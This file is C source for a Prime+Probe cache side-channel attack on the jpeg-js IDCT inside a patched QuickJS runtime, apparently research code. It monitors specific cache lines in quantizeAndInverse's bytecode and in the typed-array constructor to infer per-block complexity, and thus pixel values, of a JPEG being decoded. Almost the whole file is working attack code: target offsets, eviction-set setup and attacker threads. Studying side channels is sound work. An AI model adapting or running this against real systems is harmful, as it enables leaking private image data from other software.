/*
 * Single-process I1/DA (bytecode-instruction) attack on jpeg-js IDCT.
 *
 * Instead of monitoring shared bytecode-handler code (mul/sar), which fires
 * across the whole decoder and only distinguishes paths by timing, this attack
 * monitors cache lines of quantizeAndInverse's OWN bytecode buffer. Those bytes
 * are read (by the interpreter's `opcode = *pc++`) only while this function
 * runs, so the signal is automatically IDCT-specific, and the simple vs complex
 * path live at distinct, fixed offsets in the buffer -- a direct path oracle,
 * no phase localization or CSI needed.
 *
 * The bytecode buffer is heap-allocated, so its address is not stable across
 * processes. We therefore run the victim as a thread in the SAME process
 * (quickjs_runtime_thread) and read the address the patched runtime exports in
 * llct_qai_bytecode after the function is compiled.
 *
 * Monitored lines (offsets within quantizeAndInverse's bytecode, derived by
 * disassembly -- these are produced by QuickJS's bytecode compiler and do not
 * depend on the C optimization level):
 *   slot0  entry/dequant  (offset 0)     -- dequant loop + row-loop header;
 *                                            a per-block clock / segmentation.
 *   slot1  row butterfly  (offset 448)   -- reached only on complex rows.
 *   slot2  col butterfly  (offset 1152)  -- reached only on complex columns.
 * Per block, (row+col butterfly hits) is the complexity == pixel value.
 *
 * slot3 is different: it monitors the C routine js_typed_array_constructor
 * (exported as llct_ta_ctor), not a bytecode line. buildComponentData's per-row
 * header runs `for(i=0;i<8;i++) lines.push(new Uint8Array(samplesPerLine))`, so
 * this routine fires exactly 8x per block-ROW and nowhere else inside the IDCT
 * window. Its bursts mark exact row boundaries, so the decoder measures the
 * block count of every row instead of guessing one width -- this removes the
 * raster drift that a single assumed width causes when a block is missed.
 */
#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "cache/cache_param.h"
#include "quickjs_runtime.h"
#include "dsp.h"
#include "shared_memory.h"

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <x86intrin.h>

static const char *test_name = "quickjs_jpeg_bc";
static uint64_t victim_runs = 1;

enum { cache_line_count = 4, profile_iterations = 1 << 20 };
static const uint64_t max_exec_cycles = (uint64_t)4e9;
static uint64_t probe_time_arr[cache_line_count][profile_iterations];
static uint64_t sample_tsc_arr[cache_line_count][profile_iterations];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];

static pthread_barrier_t attacker_threads_barrier;

/* Monitored lines (see header comment). base==0 -> offset is within
 * quantizeAndInverse's bytecode buffer; base==1 -> the target is the exported
 * code address llct_ta_ctor (row marker), offset ignored. */
static const struct {
	const char *label;
	long offset;
	int base;
} bc_targets[cache_line_count] = {
	{ "entry", 0, 0 },
	{ "row_btf", 448, 0 },
	{ "col_btf", 1152, 0 },
	{ "row_mark", 0, 1 },
};

int main(int argc, char **argv) {
	if (argc < 2) {
		log_error("usage: %s <victim.js>", argv[0]);
		return 1;
	}
	const char *js_eval_file = argv[1];

	get_config();
	init_sync_ctx(QUICKJS_PROJ_ID);
	srand(time(NULL));

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!");
		return 1;
	}
	for (int i = 0; i < cache_line_count; ++i) {
		sample_tsc[i] = sample_tsc_arr[i];
		probe_time[i] = probe_time_arr[i];
	}

	/* Start the victim in-process. It compiles quantizeAndInverse during its
	 * warmup evals, which sets llct_qai_bytecode, then waits at the ready
	 * barrier below. */
	static quickjs_runtime_thread_config_t vcfg;
	vcfg.js_eval_file = js_eval_file;
	vcfg.victim_runs = 1;
	vcfg.pin_cpu = -1;
	pthread_t victim;
	if (pthread_create(&victim, NULL, quickjs_runtime_thread, &vcfg) != 0) {
		log_error("cannot start victim thread");
		return 1;
	}

	/* Ready rendezvous: returns after the victim's warmup, so the bytecode
	 * address is now available. */
	pthread_barrier_wait(sync_ctx.barrier);

	if (llct_qai_bytecode == NULL || llct_qai_bytecode_len == 0) {
		log_error("quantizeAndInverse bytecode not located "
		          "(is the victim decoding a JPEG?)");
		return 1;
	}
	log_info("quantizeAndInverse bytecode at %p len=%d",
	         (void *)llct_qai_bytecode, llct_qai_bytecode_len);
	log_info("row marker (js_typed_array_constructor) at %p",
	         (void *)llct_ta_ctor);

	PP_attacker_thread_config_t pt[cache_line_count];
	memset(pt, 0, sizeof(pt));
	for (int i = 0; i < cache_line_count; ++i) {
		uintptr_t base = bc_targets[i].base == 1
		                     ? (uintptr_t)llct_ta_ctor
		                     : (uintptr_t)llct_qai_bytecode;
		uintptr_t line = (base + bc_targets[i].offset) & CACHE_LINE_MASK;
		pt[i].label = bc_targets[i].label;
		pt[i].slot = i;
		pt[i].pin_cpu = -1;
		pt[i].target = line;
		PP_thread_config_init(pt[i]);
		prepare_evset_thres(pt[i].target, &pt[i].evset, &pt[i].threshold);
		if (pt[i].evset == NULL || pt[i].threshold == 0) {
			log_error("cannot build evset for %s (offset %ld)",
			          bc_targets[i].label, bc_targets[i].offset);
			return 1;
		}
		log_info("target %-8s line=%lx thresh=%d",
		         bc_targets[i].label, line, pt[i].threshold);
	}

	if (pthread_barrier_init(
	        &attacker_threads_barrier, NULL, cache_line_count) != 0) {
		log_error("Error initializing barrier");
		return 1;
	}

	pthread_t th[cache_line_count];
	for (int i = 0; i < cache_line_count; ++i) {
		int err = pthread_create(&th[i], NULL, PP_attacker_thread, &pt[i]);
		if (err != 0) {
			log_error("can't create attacker thread %d: %s", i, strerror(err));
		}
	}
	for (int i = 0; i < cache_line_count; ++i) {
		pthread_join(th[i], NULL);
	}
	pthread_join(victim, NULL);
	pthread_barrier_destroy(&attacker_threads_barrier);
	return 0;
}
